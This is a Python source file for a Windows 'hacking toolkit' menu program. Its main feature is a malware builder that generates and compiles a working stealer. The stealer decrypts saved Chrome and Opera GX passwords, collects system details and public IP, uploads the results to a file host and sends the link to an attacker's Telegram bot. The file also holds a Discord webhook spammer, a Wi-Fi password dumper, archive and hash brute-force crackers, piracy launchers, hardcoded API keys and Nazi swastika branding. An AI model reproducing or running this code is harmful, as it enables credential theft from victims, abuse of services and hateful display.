import subprocess
import os
from tkinter import W
from colorama import Fore, init
import requests
import time
import itertools
import shutil
import json
import base64
from telebot import TeleBot
import win32crypt
import sqlite3
from Crypto.Cipher import AES
import colorama
import requests
import subprocess
from zipfile import ZipFile, is_zipfile
import zipfile
import pyzipper
from datetime import datetime
import ipinfo
import hashlib
import atexit
from threading import Thread
import signal
import sys
import phonenumbers, folium
from phonenumbers import geocoder, phonenumber, timezone, carrier
from opencage.geocoder import OpenCageGeocode
import py7zr
import platform

def phoneNumberTracker(phoneNumber):
    os.system('cls')
    os.chdir(tool_parent_dir)
    try:
        
        phone_number_parsed = phonenumbers.parse(phoneNumber)
    
        print(f'{green}[+] Attempting to track location of:{white} {phonenumbers.format_number(phone_number_parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}...')
    
        print(f'{green}[+] Time Zone ID:{white} {timezone.time_zones_for_number(phone_number_parsed)}')
    
        location = geocoder.description_for_number(phone_number_parsed, 'en')
    
        if location:
            print(f'{green}[+] Region:{white} {location}')
        else:
            print(f'{green}[+] Region:{white} Unknown')
    
        if carrier.name_for_number(phone_number_parsed, 'en'):
            print(f'{green}[+] Service Provider:{white} {carrier.name_for_number(phone_number_parsed, 'en')}')
        else:
          print(f'{red}[-] Service Provider: Unknown')
    
        coder = OpenCageGeocode('42c84373c47e490ba410d4132ae64fc4')
    
        results = coder.geocode(location)

        lat = results[0]['geometry']['lat']
        lng = results[0]['geometry']['lng']
        currency = results[2]['annotations']['currency']['name']
        currency_symbol = results[2]['annotations']['currency']['symbol']
        address = coder.reverse_geocode(lat, lng)

        print(f'{green}[+] Lat:{white} {lat}')
        print(f'{green}[+] Long:{white} {lng}')
        print(f'{green}[+] Currency:{white} {currency}')
        print(f'{green}[+] Currency Symbol:{white} {currency_symbol}')
        if address:
            print(f'{green}[+] Approximate Location is:{white} {address[0]['formatted']}')
        else:
            print(f'{red}[-] No Address Found For The Given Coordinates.')
    
        my_map = folium.Map(location=[lat, lng], zoom_start=9)

        # Add a marker to the map at the specified latitude and longitude with a popup displaying the 'location' variable.
        folium.Marker([lat, lng], popup=location).add_to(my_map)

        ''' Clean the phone number and use it to generate a file name with an '.html' extension
        we'll basically save each map with the number of the owner for easy identification.'''

        file_name = f"{phoneNumber}.html"

        # Save the map as an HTML file with the generated file name.
        my_map.save(file_name)

        # Print a message indicating where the saved HTML file can be found.
        print(f"{green}[+] See Aerial Coverage at:{white} {os.path.abspath(file_name)}")
        
    except:
        pass
    
def webhookSpammer():
    os.system('cls')
    try:
        
        print(f'{red}[*] Note: {white}if you wanna stop the attack just press {blue}(ctrl + C){rescolor}\n')
    
        url = input(f'\n{green}[+] WebHook URL:{white} ')
    
        content = input(f'\n{green}[+] {white}What Do You Like To Send {blue}(ex: Hello):{white} ')
    
        username = input(f'\n{green}[+] Type Any Name:{white} ')
    
        data = {
            'content': content,
            'username': username
            }

        os.system('cls')
    
        while True:
        
            res = requests.post(url, json=data)
    
            try:
                res.raise_for_status()
        
            except requests.exceptions.HTTPError as err:
                time.sleep(10)
        
            else:
                print("Payload delivered successfully, code {}.".format(res.status_code))
        
            time.sleep(0.1)
            
    except:
        moreOptions()
 
def wifiPassword():
    
    os.system('cls')
    
    all_ssid = []
    
    res = subprocess.check_output('netsh wlan show profile', shell=True).decode()
    
    users  = res.splitlines()
    
    for profile in users:
        
        if 'All User Profile' in profile:
            
            ssid = profile.strip().split(':')[1].strip()
            
            all_ssid.append(ssid)
    
    for ssid in all_ssid:
        
        res = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True).decode()
        
        data = res.strip().splitlines()
        
        for key in data:
            
            if 'Key Content' in key:
                
                print(f'\n{green}[+] SSID:{white} {ssid}\n{green}[+] Password:{white} {key.strip().split(':')[1].strip()}')
 

def nmapCommands():
    os.system('cls')
    print('''

All You Need To Know About How To Use Nmap To Scan Your Target

By Apkaless

Instagram: Apkaless

====================================================================

================
|Basic Scanning|
================

nmap -F -A --open [target] | -F: Fast Scan, -A: enable OS Detection and Version Scanning, --open: only open ports will be displayed

nmap -iL [filename.txt]

nmap -iR [number of random ip]

nmap [target] --exclude [target]

nmap [target] --excludefile [filename.txt]

nmap --top-ports [number of ports ex: 10] [target]

nmap -PN [target] scan the host even if its down

nmap -sP [target] ping scan, only displays up hosts

=======================================================

===================
|Advanced Scanning|
===================

nmap -sS [target],  syn stealth scan

nmap -sT [target], TCP Scan

nmap -sU [target], UDP Scan

nmap -sX [target], trying to get response from a system being protected by a firewall

nmap -sA [target]

nmap -sO [target], ip protocol scan

nmap --send-eth [target], sends eth packets

nmap --send-ip [target], sends ip packets
''')

def wordlist():
    
    os.system('cls')
    os.chdir(tool_parent_dir)
    min_len = int(input(f'\n{green}[+] Min Length:{rescolor} '))
    
    max_len = int(input(f'\n{green}[+] Max Length:{rescolor} '))
    
    passwords_chars = input(f'\n{green}[+] What are the chars you want (ex: abc1234):{rescolor} ')
    
    filename = input(f'\n{green}[+] Type The Filename:{rescolor} ')
    
    gen_password = []
    
    try:
        
        os.mkdir('wordlist')
    except:
        pass
    
    os.chdir('wordlist')
    
    with open(filename + '.txt', 'a') as f:
        
        for plen in range(min_len, max_len + 1):
            
            passwords = itertools.product(passwords_chars, repeat=plen)
        
            for password in passwords:
                
                full_password = ''.join(password)
                
                
                f.writelines([full_password, '\n'])
                
                gen_password.append(full_password)
                
    wordlistpath = os.path.abspath(filename + '.txt')
    os.system('cls')
    os.chdir(tool_parent_dir)
    print(f'''{blue}
          
|===============|          
|     status    |
|===============|

{green}[+] Min Length:{white} {min_len}
{green}[+] Max Length:{white} {max_len}
{green}[+] Chars Selected:{white} {passwords_chars}
{green}[+] Words Generated:{white} {len(gen_password)}
{green}[+] Wordlist Path:{white} {wordlistpath}
''')
    
def malware(botToken, cid, malname, malico):
    
    os.system('cls')
    os.chdir(tool_parent_dir)
    code = r"""
import shutil
import os
import json
import base64
import time
from attr import s
from telebot import TeleBot
import win32crypt
import sqlite3
from Crypto.Cipher import AES
import colorama
import requests
import subprocess

def get_pc_name_and_public_ip():
    
        pc_name = os.getlogin()
    
        ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode()
    
        cpu = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]

        gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')[1]
    
        with open('passwords_google_database.txt', 'a') as f:
        
            f.writelines(['*'*50, '\n', f'PC Name: {pc_name}', '\n', f'CPU: {cpu}', '\n', f'GPU: {gpu}', '\n', f'Public IP: {ip}', '\n' , '*'*50, '\n\n'])

            f.close() 
        
def send_email(download_link):
    
    token = '%s'
    
    chat_id = %s
    
    url = f'https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text={download_link}'
    
    requests.get(url)
    
def upload_file(file):
    
    res = subprocess.check_output('curl -s https://api.gofile.io/getServer', shell=True).decode()
    
    jsdata = json.loads(res)
    
    server = jsdata['data']
    
    server = server['server']
    
    res = subprocess.check_output(f'curl -s -F file=@{file} https://{server}.gofile.io/uploadFile', shell=True).decode()
    
    jsdata = json.loads(res)
    
    download_link = jsdata['data']['downloadPage']
    
    send_email(download_link)

class Chrome:
    
    def __init__(self) -> None:
        pass
    
    def get_encrypt_key(self):
    
        local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'))
    
    
        with open(local, 'r') as f:
        
            jsdata = json.loads(f.read())
        
    
        return jsdata['os_crypt']['encrypted_key']


    def decode_encrypted_key(self, encrypted_key):
    
        return base64.b64decode(encrypted_key)


    def decrypt_decoded_key(self, decoded_key):
        
        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

    def decrypt_saved_password(self, password, key):
    
        try:

            iv = password[3:15]
        
            password = password[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return


class Opera:
        
    def __init__(self) -> None:
        pass
    
    def get_encrypt_key(self):
    
        local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Local State'))
    
    
        with open(local, 'r') as f:
        
            jsdata = json.loads(f.read())
        
    
        return jsdata['os_crypt']['encrypted_key']


    def decode_encrypted_key(self, encrypted_key):
    
        return base64.b64decode(encrypted_key)


    def decrypt_decoded_key(self, decoded_key):
        
        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

    def decrypt_saved_password(self, password, key):
    
        try:

            iv = password[3:15]
        
            password = password[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return
            
def chrome():
    
    try:
        
        chrome = Chrome()
    
        encrypted_key = chrome.get_encrypt_key()

        decoded_key = chrome.decode_encrypted_key(encrypted_key)[5:]

        decrypted_key = chrome.decrypt_decoded_key(decoded_key)

        db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'))

        filename = 'ChromeData.db'
    
        shutil.copyfile(db, filename)
    
        database = sqlite3.connect(filename)
    
        if database:
    

            cursor = database.cursor()
        
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
            for row in cursor.fetchall():
                print('='*40)
            
                origin_url = row[0]
                action_url = row[1]
                user_or_email = row[2]
                password = row[3]
                password = chrome.decrypt_saved_password(password, decrypted_key)
            
                print('*'*50)
            
                result =f'''
    {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Google Chrome
    {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
    {colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
    {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
    {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                        '''
            
                print(result)
                print('*'*50)
            
                with open('passwords_google_database.txt', 'a') as f:
                    f.writelines([f'[+] Browser: Google Chrome\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])
              
        database.close()           
        os.remove('ChromeData.db')
        
    except:
        pass
    
def opera():
    
    try:
        
        opera = Opera()
    
        encrypted_key = opera.get_encrypt_key()

        decoded_key = opera.decode_encrypted_key(encrypted_key)[5:]

        decrypted_key = opera.decrypt_decoded_key(decoded_key)

        db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Login Data'))

        filename = 'OperaData.db'
    
        shutil.copyfile(db, filename)
    
        database = sqlite3.connect(filename)
    
        if database:
    

            cursor = database.cursor()
        
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        
            for row in cursor.fetchall():
                print('='*40)
            
                origin_url = row[0]
                action_url = row[1]
                user_or_email = row[2]
                password = row[3]
                password = opera.decrypt_saved_password(password, decrypted_key)
            
                print('*'*50)
            
                result =f'''
    {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Opera GX
    {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
    {colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
    {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
    {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                        '''
            
                print(result)
                print('*'*50)
            
                with open('passwords_google_database.txt', 'a') as f:
                    f.writelines([f'[+] Browser: Opera GX\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])
              
        database.close()           
        os.remove('OperaData.db')
    except:
        pass
    
def main():
    
    print('\n================= Chrome =================\n\n')
    
    chrome()
    
    print('\n================= Opera =================\n\n')
    opera()

if __name__ == '__main__':

    userprofile = os.path.join(os.environ['USERPROFILE'])
    os.chdir(userprofile)
    colorama.init(convert=True)
    get_pc_name_and_public_ip()
    main()
    upload_file('passwords_google_database.txt')
    os.remove('passwords_google_database.txt')

""" %(str(botToken), cid)
    
    with open(malname + '.py', 'w') as f:
        
        f.writelines([code])
        f.close()
    
    py2exe(malname + '.py', malico)




def py2exe(fpath, icpath):
    os.chdir(tool_parent_dir)
    try:
        
        # loop to check if python installed or not, if not then install it right now and break the loop
        while True:
            os.system('cls')
            # check if python installed
            try:
                subprocess.check_output('python --version', shell=True).decode()
        
            except:
                # python is not installed, try to install it now with curl
        
                # launch the magic to install the python
                subprocess.check_output('curl -s https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe --output python64launcher.exe', shell=True).decode()
        
                subprocess.check_output('start python64launcher.exe -s')
                time.sleep(3)
                continue
        
            else:
            
               break
   
        # loop to check if pyinstaller installed or not, if not then install it right now and break the loop
        while True:
            os.system('cls')
            # check if pyinstaller installed
            try:
                subprocess.check_output('pyinstaller --version', shell=True).decode()
        
            except:
                # pyinstaller is not installed, try to install it now with curl

                # launch the magic to install the pyinstaller
                subprocess.check_output('pip install pyinstaller', shell=True).decode()
            
                time.sleep(3)
                continue
        
            else:
            
               break

         # loop to check if pillow installed or not, if not then install it right now and break the loop

        while True:
            os.system('cls')
            # check if pillow installed
            subprocess.check_output('pip install -q pillow', shell=True).decode()
            
            break       
    
        os.system('cls')
    
        subprocess.check_output(f'pyinstaller --onefile {fpath} --icon {icpath} --noconsole', shell=True)
        
    except KeyboardInterrupt:
        moreOptions()
    
    else:
        os.system('cls')
        print(f'{green}[+] Malware Path:{white} {os.path.abspath(fpath)}')
        split_py = fpath.split('.')[0]
        spec =split_py + '.spec'
        shutil.rmtree('build')
        os.remove(fpath)
        os.remove(spec)
        
def public_ip():
    
    os.system('cls')
    
    ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode().strip()

    return ip

def sysinfo():
    
    os.system('cls')
    
    cpu = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]
    gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')[1]
    memlist = subprocess.check_output('wmic memorychip get devicelocator, manufacturer, speed, DataWidth', shell=True).decode().strip().split('\n')
    bios = subprocess.check_output('wmic bios get name, Version, SoftwareElementID, SerialNumber, Manufacturer', shell=True).decode()
    mb = subprocess.check_output('wmic baseboard get Manufacturer, product, Version', shell=True).decode()
    
    print(f'\n{green}===================> {white}CPU & GPU{green} <===================={white}\n')
    
    print(f'{green}[+] CPU:{white} ', cpu)
    
    print(f'\n{green}[+] GPU:{white} ', gpu)
    
    print(f'\n{green}===================> {white}Memory{green} <===================={white}\n')
    
    for mem in memlist:
        
        print(mem)
        
    print(f'\n{green}===================> {white}BIOS{green} <===================={white}\n')
    
    print(bios)
    
    print(f'{green}===================> {white}MotherBoard{green} <===================={white}\n')
    
    print(mb)
    

def zipfilecracker(zipf, passwordsList):
    os.system('cls')
    
    #init zipfile object
    os.chdir(tool_parent_dir)
    if is_zipfile(zipf):
        
        zf = ZipFile(zipf)
        
        with open(passwordsList, 'rb') as pwdf: # open file cotains passwords
            
            pwdsList = pwdf.readlines() # read all file lines and store them into list
            
            for pwd in pwdsList: # iterate through list
                
                password = pwd.strip()
                
                try:
                    
                    zf.extractall(pwd=password) # try to extract the zipped file with the given password
                    
                except NotImplementedError: # is the zipped file was encrypted by zipcrypto instead of AES256
                    
                    try:
                        
                        aesf = pyzipper.AESZipFile(zipf)
                        
                        aesf.extractall(pwd=password)
                        
                    except:
                       print(f'\n{red}[-] Password Error:{white} {password.decode()}')
                       
                       
                    else:
                        print(f'\n{green}[+] Password Found:{white} {password.decode()}')
                        break
                        
    
def ip_lookup(ip):
    
    os.system('cls')
    
    try:
        
        accessToken = '58950d8a1c1383'
    
        handler = ipinfo.getHandler(accessToken)
    
        details = handler.getDetails(ip)
    
        for key, value in details.all.items():
        
            print(f'{green}[+] {key}:{white} {value}')
    except:
        print(f'\n{red}[-] Invalid IP Address:{white} {ip}')
        

def hash_cracker(hash, pwds, hash_type):
    os.system('cls')
    supported_hashes = {
        
        1: hashlib.sha256,
        2: hashlib.sha1,
        3: hashlib.sha224,
        4: hashlib.sha384,
        5: hashlib.sha512,
        6: hashlib.md5
        }
    
    if hash_type in supported_hashes:
        
        hash_to_crack = hash
        hashtype = supported_hashes[hash_type]
        try:
            
            with open(pwds, 'r') as f:
        
                pwd = f.readlines()
                for passwd in pwd:
            
                    testing_hash = hashtype(passwd.encode()).hexdigest()
            
                    if testing_hash == hash_to_crack:
                
                        print(f'{green}[+] Hash Has Been Cracked:{white} {passwd}')
                        break
                    else:
                        print(f'{yellow}[!] Trying With:{white} {passwd}')
                        continue
                else:
                    print(f'\n{green}[+] {white}Process Has Been Finished')
        except OSError:
            os.system('cls')
            print(f'\n{red}[-] The Passwords List Not Found, Please Make Sure You Have The Correct Path.')
    else:
        print(f'\n{red}[-] {white}Hash Type Isn\'t Supported !')
        time.sleep(3)


def sevenz_cracker(sevenzfile, passlist):
    os.system('cls')
    if py7zr.is_7zfile(sevenzfile):
        
        with open(passlist, 'r') as f:
            
            passwords = f.readlines()
        
            for password in passwords:
            
                passwd = password.strip()
                
                with py7zr.SevenZipFile(file=sevenzfile, password=passwd) as sevenZ:
                    
                    try:
                        
                        sevenZ.extractall()
                        
                    except:
                        print(f'{red}[-] Error Password: {white}{passwd}')
                        continue
                    
                    else:
                        print(f'\n{green}[+] Password Found: {white}{passwd}')
    else:
        print(f'{red}\n[-] The File Is Not a 7z File')
        time.sleep(3)
    
def moreOptions():
    os.chdir(tool_parent_dir)
    while True:
        
            os.system('cls')
            try:
                
                print(f'''
                             
{green}[10] {lcyan}Discord Usernames Checker                                                 {green}[19] {lcyan}Zip File {lcyan}Password Cracker
{green}[11] {lcyan}Discord Webhook Spammer                                                   {green}[20] {lcyan}IP LOOKUP
{green}[12] {lcyan}Malware {green}(Steal Google Chrome And Opera GX Passwords)                      {green}[21] {lcyan}Phone Number Tracker
{green}[13] {lcyan}Extract All WI-FI Passwords That You Have Connected Recently              {green}[99] {lcyan}Main Menu      
{green}[14] {lcyan}Most Nmap Commands Used By {green}(Black Hat Team)
{green}[15] {lcyan}Wordlist Generator {green}(Brute Force And Dictionary Attack){rescolor}
{green}[16] {lcyan}Convert {green}Python {lcyan}File To {green}EXE {lcyan}File     
{green}[17] {lcyan}Hash {lcyan}Cracker
{green}[18] {lcyan}7z File Password Cracker  

             ''')
                cmd = input(f'{lcyan}!{green}]==={lcyan}{terminal * 13}{green}==>{white} ')


                if cmd == '10':
                    os.chdir(path_to_temp)
                    subprocess.check_output('start tools/discordHunter.exe', shell=True)
                    moreOptions()
                if cmd == '11':
        
                    webhookSpammer()
                    input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

                if cmd == '12':
                    os.system('cls')
                    try:
                    
                        btoken = input(f'\n{green}[+] Telegram Bot Token:{white} ')
                        cid = input(f'\n{green}[+] Telegram Channel ID:{white} ')
                        malname = input(f'\n{green}[+] Malware Name:{white} ')
                        malico = input(f'\n{green}[+] Icon Path:{white} ')
                
                        malware(btoken, cid, malname, malico)
                        input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                    
                    except KeyboardInterrupt:
                        pass

                if cmd == '13':
        
                    wifiPassword() 
                    input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                if cmd == '14':
        
                    nmapCommands()
                    input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')

                if cmd == '15':
                    try:
                        wordlist()
                        input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                    except KeyboardInterrupt:
                        moreOptions()

                if cmd == '16':
                
                    os.system('cls')
                
                    try:
                    
                        appname = input(f'\n{green}[+] App Name:{white} ')
                
                        appico = input(f'\n{green}[+] Icon Path:{white} ')
                
                        py2exe(appname, appico)
                    
                    except KeyboardInterrupt:
                        moreOptions()
                    
                if cmd == '17':
                    os.system('cls')
                    try:
                        print(f'''{yellow}[!] {white}Supported Hash Types:
                          
            {blue}[1] {white}sha256
            {blue}[2] {white}sha1
            {blue}[3] {white}sha224
            {blue}[4] {white}sha384
            {blue}[5] {white}sha512                         
            {blue}[6] {white}md5                        
    ''')                
                        try:
                        
                            hash_type = int(input(f'{green}[+] Hash Type:{white} '))
                        except:
                            print(f'\n{red}[-] Hash Type is Invalid !')
                            time.sleep(3)
                            moreOptions()
                        hash = input(f'\n{green}[+] Hash To Crack:{white} ')
                        pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List To Use:{white} '))
                        hash_cracker(hash, pwdlistinput, hash_type)
                        input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                    except KeyboardInterrupt:
                        moreOptions()
                    
                if cmd == '18':
                    os.system('cls')
                    try:
                    
                        zipfinput = os.path.join(input(f'\n{green}[+] Path To 7z File To Crack:{white} '))
                        pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List To Use:{white} '))
                        sevenz_cracker(zipfinput, pwdlistinput)
                        input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                    except KeyboardInterrupt:
                        moreOptions()
                
                        
                if cmd == '19':
                    os.system('cls')
                    try:
                    
                        zipfinput = os.path.join(input(f'\n{green}[+] Path To Zip File To Crack:{white} '))
                        pwdlistinput = os.path.join(input(f'\n{green}[+] Path To Passwords List To Use:{white} '))
                        zipfilecracker(zipfinput, pwdlistinput)
                        input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                    except KeyboardInterrupt:
                        moreOptions()
                        
                if cmd == '20':
                    os.system('cls')
                    try:
                    
                        ip = input(f'\n{green}[+] IP Address:{white} ')
                        ip_lookup(ip) 
                        input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                    except KeyboardInterrupt:
                        moreOptions()
                if cmd == '21':
                    os.system('cls')
                    try:
                    
                        phone_number = input(f'{green}[+] Type The Phone Number Without {blue}(+) {green}Sign:{white} ')
                        if '+' in phone_number:
                            phone_number = phone_number.strip('+')
                        else:
                            phone_number = '+' + phone_number
                    
                        phoneNumberTracker(phone_number)
                
                        input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
                    
                    except:
                        pass
                if cmd == '99':
                    main()
            except KeyboardInterrupt:
                exit(0)
                

def remove_tools():
    os.chdir(path_to_temp)
    shutil.rmtree('tools')
     

def main():
    os.chdir(path_to_temp)
    try:
        
        while True:
        
            os.system('cls')
            print(fr'''{white}
                                      ___
                                     |   \
                                     |    \                   ___
                                     |_____\______________.-'`   `'-.,___
                   {yellow}                 /|{white} _____     _________            ___{yellow}>---
                   {yellow}                 \|{white}___________________________,.-'`           
                                        /`'-.,__________)---------------------=\
                                /------/                                        \
                               /                                                 \ 
                              {green}|    {green}[+] Name        : {lcyan}SABAH                       {green}|
                              {green}|    {green}[+] Instagram   : {lcyan}Apkaless                    {green}|
                              {green}|    {green}[+] Github      : {lcyan}https://github.com/apkaless {green}|
                              {green}|    {green}[+] Codename    : {lcyan}{codename}                          {green}|
                              {green}|    {green}[+] Nationality : {lcyan}Iraq                        {green}|                
        ================================================================================================
                                
        {green}[1] {lcyan}IDM Trial Reset                                 {green}[8] {lcyan}PUBLIC IP
        {green}[2] {lcyan}Activate Windows {green}(10 & 11)                      {green}[9] {lcyan}SYSTEM INFORMATION
        {green}[3] {lcyan}Optimize Network Adapter                        {green}[99] {lcyan}More
        {green}[4] {lcyan}Fix The Game's Server Refuse Your Connection
        {green}[5] {lcyan}Proxy Generator
        {green}[6] {lcyan}Proxy Checker
        {green}[7] {lcyan}Clean Your System With One Hit                    

         ''')
    
            cmd = input(f'{green}[{green}{str(datetime.now().strftime('%a:%m:%d:%y | %I:%M %p'))}{green}]==={lcyan}{terminal * 13}{green}==>{white} ')


            if cmd == '1':
                try:
                
                    subprocess.check_output('start tools/IDM_Trial_Reset.exe', shell=True)
                except:
                    continue

            if cmd == '2':
                try:
                
                    subprocess.check_output('start tools/WindowsActivation.exe', shell=True)
                except:
                    continue

            if cmd == '3':
                try:
                
                    subprocess.check_output('start tools/network_Optimization.exe', shell=True)
                except:
                    continue

            if cmd == '4':
                try:
                
                    subprocess.check_output('start tools/FixYourGameConnection.exe', shell=True)    
                except:
                    continue
            
            if cmd == '5':
                try:
                
                    subprocess.check_output('start tools/proxy_scraper.exe', shell=True)

                except:
                    continue
            if cmd == '6':
                try:
                
                    subprocess.check_output('start tools/proxy_checker.exe', shell=True)
                except:
                    continue
            
            if cmd == '7':
                try:
                
                    subprocess.check_output('start tools/cleaner.exe', shell=True)
                except:
                    continue
            
            if cmd == '8':
        
                ip = public_ip()
            
                print(f'\n{green}[+] Public IP:{white} {ip}')
            
                input(f'\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
            
            if cmd == '9':
        
                sysinfo()
                input(f'\n\n{blue}[!] {green}Hit ENTER TO GO BACK {rescolor}')
            
            if cmd == '99':
        
                moreOptions()
                                    
        time.sleep(1)
        
    except KeyboardInterrupt:
        exit(0)
           
if __name__ == '__main__':
    os.system('cls')
    red = Fore.RED
    white = Fore.WHITE
    blue = Fore.BLUE
    green = Fore.GREEN
    yellow = Fore.YELLOW
    lightyellow = Fore.LIGHTYELLOW_EX
    cyan = Fore.CYAN
    lcyan = Fore.LIGHTCYAN_EX
    rescolor = Fore.RESET
    tool_parent_dir = os.getcwd()
    username = os.getlogin()
    path_to_temp = f'C:/Users/{username}/AppData/Local/Temp'
    zipfile_password = 'apkaless@iraq@2003@sabah@@2003'
    os.chdir(path_to_temp)
    if os.path.exists('tools'):
        pass
    else:       
        os.chdir(tool_parent_dir)
        with py7zr.SevenZipFile('tools.7z',mode='r', password=zipfile_password) as zf:
            zf.extractall(path_to_temp)
    
    version_info = platform.win32_ver()[0]
    
    if version_info == '11':
    
        codename = '卐'
        terminal = '卐'
        
    else:
        
        codename = 'Nazi'
        terminal = '@'
        
    main()